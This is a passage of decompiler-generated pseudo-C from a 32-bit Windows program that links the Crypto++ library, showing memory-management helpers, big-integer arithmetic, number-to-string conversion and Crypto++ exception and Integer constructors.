    v52 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v5 + 24))(v5, v63);
    sub_43DBB0(v63, v52);
    v95 = (_DWORD *)((char *)v95 + 1);
    v6 = a5;
  }
  v60 = v65;
  v61 = v66;
  if ( v64 < v65 )
    v60 = v64;
  LOBYTE(v84) = 10;
  memset(v66, 0, 4 * v60);
  if ( v60 )
    j_j_unknown_libname_61(v61);
  else
    j_j___free_base(v61);
  sub_439DC0(&v90);
  sub_43C8D0(&v85);
}
// 43BDF4: conditional instruction was optimized away because %arg_C.4 is in (1..15555555)
// 420130: using guessed type void __noreturn sub_420130(void);
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 43BD40: using guessed type _DWORD var_84[2];
// 43BD40: using guessed type _DWORD var_6C[2];
// 43BD40: using guessed type _DWORD var_A8[2];

//----- (0043C450) --------------------------------------------------------
int __thiscall sub_43C450(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 84))(this[1]);
}

//----- (0043C460) --------------------------------------------------------
_DWORD *__thiscall sub_43C460(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  unsigned int v6; // edx
  void *v7; // esi
  _DWORD v9[2]; // [esp+10h] [ebp-3Ch] BYREF
  unsigned int v10; // [esp+18h] [ebp-34h]
  unsigned int v11; // [esp+1Ch] [ebp-30h]
  void *v12; // [esp+20h] [ebp-2Ch]
  _DWORD v13[2]; // [esp+28h] [ebp-24h] BYREF
  unsigned int v14; // [esp+30h] [ebp-1Ch]
  unsigned int v15; // [esp+34h] [ebp-18h]
  void *Block; // [esp+38h] [ebp-14h]
  int v17; // [esp+48h] [ebp-4h]

  sub_44E440(a2, v9, (int)a2);
  v17 = 0;
  sub_4432F0(v9, v13, this + 3);
  LOBYTE(v17) = 1;
  v3 = sub_43DBB0(this + 15, v13);
  v4 = v15;
  v5 = Block;
  if ( v14 < v15 )
    v4 = v14;
  LOBYTE(v17) = 2;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v6 = v11;
  v7 = v12;
  if ( v10 < v11 )
    v6 = v10;
  v17 = 3;
  memset(v12, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 43C460: using guessed type _DWORD var_3C[2];
// 43C460: using guessed type _DWORD var_24[2];

//----- (0043C540) --------------------------------------------------------
int __thiscall sub_43C540(_DWORD *this)
{
  return this[48];
}

//----- (0043C550) --------------------------------------------------------
int __thiscall sub_43C550(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 72))(this[1]);
}

//----- (0043C560) --------------------------------------------------------
void __noreturn sub_43C560()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v1[10]; // [esp+2Ch] [ebp-28h] BYREF

  sub_419B80((int)v1, "PK_MessageAccumulator: TruncatedFinal() should not be called");
  v1[9] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 43C560: using guessed type void __noreturn sub_43C560();

//----- (0043C5C0) --------------------------------------------------------
int __thiscall sub_43C5C0(_DWORD *this, int a2, int a3, int *a4)
{
  int v5; // edi
  bool v6; // zf
  int v7; // eax
  int (__thiscall *v8)(int); // ebp
  int v9; // esi
  int v10; // esi
  int v11; // esi
  int v12; // eax
  int result; // eax
  int v14; // eax

  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 76))(this);
  (*(void (__thiscall **)(int, int *, int, int))(*(_DWORD *)v5 + 32))(v5, a4, a2, a3);
  this[17] = 0;
  v6 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 24))(v5) == 0;
  v7 = *(_DWORD *)v5;
  v8 = *(int (__thiscall **)(int))(*(_DWORD *)v5 + 16);
  if ( v6 )
  {
    v11 = (*(int (__thiscall **)(int))(v7 + 8))(v5);
    v12 = v8(v5);
    a2 = 1024;
    a3 = v12 * v11;
    v10 = sub_4397E0(&a2, (unsigned int *)&a3);
  }
  else
  {
    v9 = (*(int (__thiscall **)(int))(v7 + 8))(v5);
    v10 = v8(v5) * v9;
  }
  sub_43B900(this + 13, v10);
  result = (*(int (__thiscall **)(_DWORD *))(*this + 28))(this);
  if ( result < 4 )
  {
    v14 = sub_4372C0(this, a4, &a3);
    return (*(int (__thiscall **)(int, _DWORD, int, int))(*(_DWORD *)v5 + 36))(v5, this[16], v14, a3);
  }
  return result;
}

//----- (0043C680) --------------------------------------------------------
char __thiscall sub_43C680(_BYTE *this, int a2, int a3)
{
  int v4; // eax
  char result; // al

  v4 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 76))(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 16))(v4, a2, a3);
  if ( !this[116] || a3 )
  {
    result = 0;
    this[116] = 0;
  }
  else
  {
    result = 1;
    this[116] = 1;
  }
  return result;
}

//----- (0043C6C0) --------------------------------------------------------
int __thiscall sub_43C6C0(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v5; // esi
  _DWORD *v6; // ebx
  int result; // eax

  v5 = (_DWORD *)*this;
  if ( *this )
  {
    v6 = (_DWORD *)this[1];
    if ( v5 != v6 )
    {
      do
      {
        sub_43A280(v5);
        v5 += 16;
      }
      while ( v5 != v6 );
      v5 = (_DWORD *)*this;
    }
    if ( ((this[2] - (_DWORD)v5) & 0xFFFFFFC0) >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_46C87D(v5);
  }
  *this = a2;
  this[1] = a2 + (a3 << 6);
  result = a2 + (a4 << 6);
  this[2] = result;
  return result;
}

//----- (0043C740) --------------------------------------------------------
char *__thiscall sub_43C740(char **this, char *a2, int a3, int a4)
{
  char *v5; // esi
  char *v6; // ebx
  char *result; // eax

  v5 = *this;
  if ( *this )
  {
    v6 = this[1];
    if ( v5 != v6 )
    {
      do
      {
        (**(void (__thiscall ***)(void *, _DWORD))v5)(v5, 0);
        v5 += 24;
      }
      while ( v5 != v6 );
      v5 = *this;
    }
    if ( (unsigned int)(24 * ((this[2] - v5) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)&v5[-*((_DWORD *)v5 - 1) - 4] > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (char *)*((_DWORD *)v5 - 1);
    }
    sub_46C87D(v5);
  }
  *this = a2;
  this[1] = &a2[24 * a3];
  result = &a2[24 * a4];
  this[2] = result;
  return result;
}

//----- (0043C7D0) --------------------------------------------------------
void __stdcall sub_43C7D0(_DWORD *a1, _DWORD *a2)
{
  _DWORD *i; // esi

  for ( i = a1; i != a2; i += 16 )
    sub_43A280(i);
}

//----- (0043C800) --------------------------------------------------------
int __stdcall sub_43C800(int (__thiscall ***a1)(_DWORD, _DWORD), int (__thiscall ***a2)(_DWORD, _DWORD))
{
  int (__thiscall ***i)(_DWORD, _DWORD); // esi
  int result; // eax

  for ( i = a1; i != a2; i += 6 )
    result = (**i)(i, 0);
  return result;
}

//----- (0043C830) --------------------------------------------------------
int __thiscall sub_43C830(_DWORD *this, unsigned int a2)
{
  int v3; // edi
  _DWORD *v4; // ebx
  _DWORD *v6; // [esp-8h] [ebp-30h]
  _DWORD v7[10]; // [esp+0h] [ebp-28h] BYREF

  v7[6] = v7;
  v7[4] = this;
  v3 = (this[1] - *this) >> 6;
  v4 = sub_43CBA0(a2);
  v7[9] = 0;
  v6 = (_DWORD *)this[1];
  v7[5] = v4;
  sub_43CAB0((_DWORD *)*this, v6, (int)v4);
  return sub_43C6C0(this, (int)v4, v3, a2);
}

//----- (0043C8D0) --------------------------------------------------------
void __thiscall sub_43C8D0(_DWORD *this)
{
  _DWORD *v2; // edi
  _DWORD *v3; // ebp
  _DWORD *v4; // esi

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    v4 = (_DWORD *)*this;
    if ( v2 != v3 )
    {
      do
      {
        sub_43C960(v4);
        v4 += 3;
      }
      while ( v4 != v3 );
    }
    if ( (unsigned int)(12 * ((this[2] - (int)v2) / 12)) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (0043C960) --------------------------------------------------------
void __thiscall sub_43C960(_DWORD *this)
{
  _DWORD *v2; // edi
  _DWORD *v3; // ebp
  _DWORD *v4; // esi

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    v4 = (_DWORD *)*this;
    if ( v2 != v3 )
    {
      do
      {
        (*(void (__thiscall **)(_DWORD *, _DWORD))*v4)(v4, 0);
        v4 += 6;
      }
      while ( v4 != v3 );
    }
    if ( (unsigned int)(24 * ((this[2] - (int)v2) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (0043C9F0) --------------------------------------------------------
int __stdcall sub_43C9F0(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *v4; // esi
  int v5; // eax

  if ( a1 != a2 )
  {
    v4 = a1 + 12;
    do
    {
      sub_43D420((_DWORD *)a3, v4 - 12);
      sub_43D420((_DWORD *)(a3 + 24), v4 - 6);
      v5 = *v4;
      v4 += 16;
      *(_DWORD *)(a3 + 48) = v5;
      *(_DWORD *)(a3 + 52) = *(v4 - 15);
      *(_DWORD *)(a3 + 56) = *(v4 - 14);
      *(_BYTE *)(a3 + 60) = *((_BYTE *)v4 - 52);
      *(_BYTE *)(a3 + 61) = *((_BYTE *)v4 - 51);
      *(_BYTE *)(a3 + 62) = *((_BYTE *)v4 - 50);
      *(_BYTE *)(a3 + 63) = *((_BYTE *)v4 - 49);
      a3 += 64;
    }
    while ( v4 - 12 != a2 );
  }
  return a3;
}

//----- (0043CAB0) --------------------------------------------------------
_DWORD *__stdcall sub_43CAB0(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *v4; // esi
  int v5; // eax
  _DWORD *result; // eax

  if ( a1 != a2 )
  {
    v4 = a1 + 12;
    do
    {
      sub_43D420((_DWORD *)a3, v4 - 12);
      sub_43D420((_DWORD *)(a3 + 24), v4 - 6);
      v5 = *v4;
      v4 += 16;
      *(_DWORD *)(a3 + 48) = v5;
      *(_DWORD *)(a3 + 52) = *(v4 - 15);
      *(_DWORD *)(a3 + 56) = *(v4 - 14);
      *(_BYTE *)(a3 + 60) = *((_BYTE *)v4 - 52);
      *(_BYTE *)(a3 + 61) = *((_BYTE *)v4 - 51);
      *(_BYTE *)(a3 + 62) = *((_BYTE *)v4 - 50);
      *(_BYTE *)(a3 + 63) = *((_BYTE *)v4 - 49);
      a3 += 64;
      result = v4 - 12;
    }
    while ( v4 - 12 != a2 );
  }
  return result;
}

//----- (0043CB70) --------------------------------------------------------
void *__stdcall sub_43CB70(unsigned int a1, int a2)
{
  sub_420FD0(a1);
  if ( a1 )
    return sub_45AEA0(4 * a1);
  else
    return 0;
}

//----- (0043CBA0) --------------------------------------------------------
_DWORD *__stdcall sub_43CBA0(unsigned int a1)
{
  unsigned int v1; // ecx
  size_t v2; // eax
  void *v3; // eax
  void *v4; // ecx
  _DWORD *result; // eax

  v1 = a1 << 6;
  if ( a1 <= 0x3FFFFFF )
  {
    if ( v1 < 0x1000 )
    {
      if ( v1 )
        return operator new(a1 << 6);
      else
        return 0;
    }
  }
  else
  {
    v1 = -1;
  }
  v2 = v1 + 35;
  if ( v1 + 35 <= v1 )
    v2 = -1;
  v3 = operator new(v2);
  v4 = v3;
  if ( !v3 )
    _invalid_parameter_noinfo_noreturn();
  result = (_DWORD *)(((unsigned int)v3 + 35) & 0xFFFFFFE0);
  *(result - 1) = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0043CC00) --------------------------------------------------------
_DWORD *__stdcall sub_43CC00(unsigned int a1)
{
  unsigned int v1; // ecx
  size_t v2; // eax
  void *v3; // eax
  void *v4; // ecx
  _DWORD *result; // eax

  v1 = 24 * a1;
  if ( a1 <= 0xAAAAAAA )
  {
    if ( v1 < 0x1000 )
    {
      if ( v1 )
        return operator new(24 * a1);
      else
        return 0;
    }
  }
  else
  {
    v1 = -1;
  }
  v2 = v1 + 35;
  if ( v1 + 35 <= v1 )
    v2 = -1;
  v3 = operator new(v2);
  v4 = v3;
  if ( !v3 )
    _invalid_parameter_noinfo_noreturn();
  result = (_DWORD *)(((unsigned int)v3 + 35) & 0xFFFFFFE0);
  *(result - 1) = v4;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0043CC60) --------------------------------------------------------
void __stdcall sub_43CC60(void *a1, int a2)
{
  void *v2; // eax

  v2 = a1;
  if ( (unsigned int)(a2 << 6) >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_46C87D(v2);
}

//----- (0043CCA0) --------------------------------------------------------
void __stdcall sub_43CCA0(void *a1, int a2)
{
  void *v2; // eax

  v2 = a1;
  if ( (unsigned int)(24 * a2) >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_46C87D(v2);
}

//----- (0043CCE0) --------------------------------------------------------
_DWORD *__cdecl sub_43CCE0(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+4h] [ebp-2Ch] BYREF
  int v4[4]; // [esp+14h] [ebp-1Ch] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  v4[0] = (int)&CryptoPP::OID::`vftable';
  v1 = operator new(4u);
  v4[1] = (int)v1;
  *v1 = 1;
  v4[3] = (int)(v1 + 1);
  v4[2] = (int)(v1 + 1);
  v5 = 0;
  sub_43A320(v3, (int)v4, 2);
  sub_408A00(v4);
  v5 = 1;
  sub_43A320(a1, (int)v3, 840);
  sub_408A00(v3);
  return a1;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8A28: using guessed type void *CryptoPP::OID::`vftable';
// 43CCE0: using guessed type _DWORD var_2C[4];

//----- (0043CD80) --------------------------------------------------------
void *__stdcall sub_43CD80(void *Block, unsigned int a2, unsigned int a3, char a4)
{
  void *v5; // ebp
  unsigned int v6; // eax
  size_t v7; // eax

  if ( a2 == a3 )
    return Block;
  if ( a4 )
  {
    sub_420FD0(a3);
    if ( a3 )
      v5 = (void *)sub_45AC10(4 * a3);
    else
      v5 = 0;
    v6 = a2;
    if ( a3 < a2 )
      v6 = a3;
    v7 = 4 * v6;
    if ( Block && v5 )
      sub_438F30(v5, v7, Block, v7);
    memset(Block, 0, 4 * a2);
    if ( a2 )
      j_j_unknown_libname_61(Block);
    else
      j_j___free_base(Block);
    return v5;
  }
  else
  {
    memset(Block, 0, 4 * a2);
    if ( a2 )
      j_j_unknown_libname_61(Block);
    else
      j_j___free_base(Block);
    sub_420FD0(a3);
    if ( a3 )
      return (void *)sub_45AC10(4 * a3);
    else
      return 0;
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043CE60) --------------------------------------------------------
BOOL __fastcall sub_43CE60(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  unsigned int v7; // ecx
  bool v8; // cf
  char v9; // cf
  int v10; // esi
  int v11; // esi
  BOOL v12; // ett
  int v13; // esi
  int v14; // esi
  BOOL v15; // ett
  int v16; // esi
  int v17; // esi
  int v18; // ett
  int v19; // esi
  int v20; // esi
  BOOL v21; // ett

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8 = 0;
  if ( (v7 & 2) == 0 )
    goto LABEL_3;
  v9 = v7 < 2;
  for ( v7 -= 2; ; *(_DWORD *)(v6 + 4 * v7 + 4) = *(_DWORD *)(v5 + 4 * v7 + 4) + v14 )
  {
    v16 = *(_DWORD *)(v4 + 4 * v7 + 8);
    v18 = v9;
    v8 = __CFADD__(v9, v16);
    v17 = v18 + v16;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 8), v17);
    *(_DWORD *)(v6 + 4 * v7 + 8) = *(_DWORD *)(v5 + 4 * v7 + 8) + v17;
    v19 = *(_DWORD *)(v4 + 4 * v7 + 12);
    v21 = v8;
    v8 = __CFADD__(v8, v19);
    v20 = v21 + v19;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 12), v20);
    *(_DWORD *)(v6 + 4 * v7 + 12) = *(_DWORD *)(v5 + 4 * v7 + 12) + v20;
    v7 += 4;
LABEL_3:
    if ( !v7 )
      break;
    v10 = *(_DWORD *)(v4 + 4 * v7);
    v12 = v8;
    v8 = __CFADD__(v8, v10);
    v11 = v12 + v10;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7), v11);
    *(_DWORD *)(v6 + 4 * v7) = *(_DWORD *)(v5 + 4 * v7) + v11;
    v13 = *(_DWORD *)(v4 + 4 * v7 + 4);
    v15 = v8;
    v8 = __CFADD__(v8, v13);
    v14 = v15 + v13;
    v9 = v8 | __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 4), v14);
  }
  return v8;
}

//----- (0043CED0) --------------------------------------------------------
BOOL __fastcall sub_43CED0(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  unsigned int v7; // ecx
  bool v8; // cf
  bool v9; // cf
  unsigned int v10; // esi
  unsigned int v11; // ett
  unsigned int v12; // esi
  unsigned int v13; // ett
  unsigned int v14; // esi
  unsigned int v15; // ett
  unsigned int v16; // esi
  unsigned int v17; // ett

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8 = 0;
  if ( (v7 & 2) == 0 )
    goto LABEL_3;
  v9 = v7 < 2;
  for ( v7 -= 2; ; *(_DWORD *)(v6 + 4 * v7 + 4) = v12 - v13 )
  {
    v14 = *(_DWORD *)(v4 + 4 * v7 + 8);
    v15 = v9 + *(_DWORD *)(v5 + 4 * v7 + 8);
    v8 = v14 < v15;
    *(_DWORD *)(v6 + 4 * v7 + 8) = v14 - v15;
    v16 = *(_DWORD *)(v4 + 4 * v7 + 12);
    v17 = v8 + *(_DWORD *)(v5 + 4 * v7 + 12);
    v8 = v16 < v17;
    *(_DWORD *)(v6 + 4 * v7 + 12) = v16 - v17;
    v7 += 4;
LABEL_3:
    if ( !v7 )
      break;
    v10 = *(_DWORD *)(v4 + 4 * v7);
    v11 = v8 + *(_DWORD *)(v5 + 4 * v7);
    v8 = v10 < v11;
    *(_DWORD *)(v6 + 4 * v7) = v10 - v11;
    v12 = *(_DWORD *)(v4 + 4 * v7 + 4);
    v13 = v8 + *(_DWORD *)(v5 + 4 * v7 + 4);
    v9 = v12 < v13;
  }
  return v8;
}

//----- (0043CF40) --------------------------------------------------------
int __cdecl sub_43CF40(_DWORD *a1, unsigned __int64 a2)
{
  _DWORD *v2; // ebp
  unsigned int v3; // ebx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rax
  bool v6; // cf
  unsigned int v7; // edi
  int v8; // ecx
  unsigned int v9; // ebx
  unsigned __int64 v10; // rax
  unsigned int v11; // ebx
  int result; // eax
  int v13; // ecx
  int v14; // ebx
  int v15; // ecx
  int v16; // [esp+10h] [ebp-Ch]
  unsigned int v17; // [esp+20h] [ebp+4h]

  if ( HIDWORD(a2) )
  {
    v2 = a1;
    if ( HIDWORD(a2) == -1 )
    {
      LODWORD(v4) = a1[2];
      v3 = a1[1];
      v16 = v4;
    }
    else
    {
      v3 = a1[1];
      v16 = a1[2];
      v4 = *(_QWORD *)(a1 + 1) / (unsigned __int64)(unsigned int)(HIDWORD(a2) + 1);
    }
  }
  else
  {
    v2 = a1;
    v3 = a1[1];
    v4 = *(_QWORD *)a1 / (unsigned __int64)(unsigned int)a2;
    v16 = a1[2];
  }
  v17 = v4;
  v5 = (unsigned int)a2 * (unsigned __int64)(unsigned int)v4;
  v6 = *v2 < (unsigned int)v5;
  *v2 -= v5;
  v7 = HIDWORD(v5);
  v8 = (v3 - (unsigned __int64)v6) >> 32;
  v9 = v3 - v6;
  v10 = HIDWORD(a2) * (unsigned __int64)v17;
  v6 = v9 < (unsigned int)v10;
  v11 = v9 - v10;
  result = v17;
  v13 = v8 - (v6 + HIDWORD(v10));
  v6 = v11 < v7;
  v14 = v11 - v7;
  v15 = v16 + v13 - v6;
  while ( 1 )
  {
    v2[2] = v15;
    v2[1] = v14;
    if ( !v15 && __PAIR64__(v14, *v2) < a2 )
      break;
    v6 = *v2 < (unsigned int)a2;
    *v2 -= a2;
    v14 = v2[1] - v6 - HIDWORD(a2);
    v15 += ((unsigned int)v2[1] - (unsigned __int64)v6 - HIDWORD(a2)) >> 32;
    result = ++v17;
  }
  return result;
}
// 43CF72: conditional instruction was optimized away because %arg_4@4.4==0

//----- (0043D030) --------------------------------------------------------
int __cdecl sub_43D030(int a1, unsigned __int64 a2, unsigned int a3)
{
  unsigned int v3; // edi
  int v4; // esi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr00_8
  size_t v7; // esi
  int v8; // edi
  __int128 *v9; // eax
  void *v10; // ecx
  __int128 v11; // xmm1
  __int64 v12; // xmm0_8
  int v14; // [esp+14h] [ebp-58h]
  unsigned int v15; // [esp+1Ch] [ebp-50h]
  char v16; // [esp+28h] [ebp-44h]
  __int128 v17; // [esp+2Ch] [ebp-40h] BYREF
  __int64 v18; // [esp+3Ch] [ebp-30h]
  __int128 v19; // [esp+44h] [ebp-28h] BYREF
  __int64 v20; // [esp+54h] [ebp-18h]
  int v21; // [esp+68h] [ebp-4h]
  int v22; // [esp+80h] [ebp+14h]

  v3 = 0;
  v4 = a1;
  v15 = a3 >> 26;
  v5 = a2;
  v22 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v20 = 0xF00000000i64;
    LOBYTE(v19) = 0;
    v21 = 0;
    do
    {
      v14 = v5 % (unsigned int)v22;
      v6 = v5 / (unsigned int)v22;
      if ( v5 % (unsigned int)v22 >= 0xA )
        v16 = (~(_BYTE)v15 & 0x20 | 0x41) - 10;
      else
        v16 = 48;
      v7 = v20;
      v8 = v3 | 2;
      LOBYTE(v21) = 1;
      v18 = 0xF00000000i64;
      LOBYTE(v17) = 0;
      sub_4196B0((void **)&v17, v20 + 1);
      sub_419990((int)&v17, v14 + v16);
      v9 = &v19;
      if ( HIDWORD(v20) >= 0x10 )
        v9 = (__int128 *)v19;
      sub_41F120((char *)&v17, v9, v7);
      if ( HIDWORD(v20) >= 0x10 )
      {
        v10 = (void *)v19;
        if ( (unsigned int)(HIDWORD(v20) + 1) >= 0x1000 )
        {
          v10 = *(void **)(v19 - 4);
          if ( (unsigned int)(v19 - (_DWORD)v10 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_46C87D(v10);
      }
      v11 = v17;
      v3 = v8 & 0xFFFFFFFD;
      v12 = v18;
      v5 = v6;
      v20 = v18;
      LOBYTE(v21) = 0;
      v19 = v17;
    }
    while ( v6 );
    v4 = a1;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = v11;
    *(_QWORD *)(a1 + 16) = v12;
  }
  else
  {
    sub_419B80(a1, "0");
  }
  return v4;
}
// 43D0B1: conditional instruction was optimized away because %arg_4.8!=0

//----- (0043D200) --------------------------------------------------------
char *__thiscall sub_43D200(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::Integer::DivideByZero::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BAD18: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';

//----- (0043D290) --------------------------------------------------------
char *__thiscall sub_43D290(char *this)
{
  void *v2; // ecx
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v5; // [esp+24h] [ebp-14h]
  int v6; // [esp+34h] [ebp-4h]

  sub_419B80((int)v4, "Integer: division by zero");
  v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v6) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, v4);
  if ( v5 >= 0x10 )
  {
    v2 = (void *)v4[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v2 = *(void **)(v4[0] - 4);
      if ( (unsigned int)(v4[0] - (_DWORD)v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
  *(_DWORD *)this = &CryptoPP::Integer::DivideByZero::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BAD18: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';

//----- (0043D360) --------------------------------------------------------
_DWORD *__thiscall sub_43D360(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int v4; // eax
  unsigned int v5; // edx
  _DWORD *v6; // eax

  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v4 = a3;
  *this = &CryptoPP::Integer::`vftable';
  if ( v4 > 8 )
  {
    if ( v4 > 0x10 )
    {
      if ( v4 > 0x20 )
      {
        if ( v4 > 0x40 )
        {
          a3 = v4 - 1;
          v5 = 1 << sub_4327F0(&a3);
        }
        else
        {
          v5 = 64;
        }
      }
      else
      {
        v5 = 32;
      }
    }
    else
    {
      v5 = 16;
    }
  }
  else
  {
    v5 = dword_4BACF0[v4];
  }
  this[2] = 0x3FFFFFFF;
  this[3] = v5;
  v6 = (_DWORD *)sub_41E7A0(v5, 0);
  this[4] = v6;
  this[5] = 0;
  *v6 = a2;
  if ( this[3] != 1 )
    memset((void *)(this[4] + 4), 0, 4 * (this[3] - 1));
  return this;
}
// 4BACF0: using guessed type int dword_4BACF0[9];
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043D420) --------------------------------------------------------
_DWORD *__thiscall sub_43D420(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // ebx
  unsigned int v4; // eax
  _DWORD *v5; // ecx
  unsigned int v6; // edx
  void *v7; // edx
  void *v8; // ecx

  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v3 = a2;
  *this = &CryptoPP::Integer::`vftable';
  v4 = v3[3];
  if ( v4 )
  {
    v5 = (_DWORD *)(v3[4] + 4 * v4 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  if ( v4 > 8 )
  {
    if ( v4 > 0x10 )
    {
      if ( v4 > 0x20 )
      {
        if ( v4 > 0x40 )
        {
          a2 = (_DWORD *)(v4 - 1);
          v6 = 1 << sub_4327F0(&a2);
        }
        else
        {
          v6 = 64;
        }
      }
      else
      {
        v6 = 32;
      }
    }
    else
    {
      v6 = 16;
    }
  }
  else
  {
    v6 = dword_4BACF0[v4];
  }
  this[2] = 0x3FFFFFFF;
  this[3] = v6;
  this[4] = sub_41E7A0(v6, 0);
  v7 = (void *)this[4];
  this[5] = v3[5];
  v8 = (void *)v3[4];
  if ( v7 != v8 )
    sub_438F30(v7, 4 * this[3], v8, 4 * this[3]);
  return this;
}
// 4BACF0: using guessed type int dword_4BACF0[9];
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043D500) --------------------------------------------------------
_DWORD *__thiscall sub_43D500(_DWORD *this, unsigned int a2)
{
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  *this = &CryptoPP::Integer::`vftable';
  this[2] = 0x3FFFFFFF;
  this[3] = 2;
  this[4] = sub_41E7A0(2u, 0);
  this[5] = a2 >> 31;
  *(_DWORD *)this[4] = abs32(a2);
  *(_DWORD *)(this[4] + 4) = 0;
  return this;
}
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043D570) --------------------------------------------------------
_DWORD *__thiscall sub_43D570(_DWORD *this, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // edi
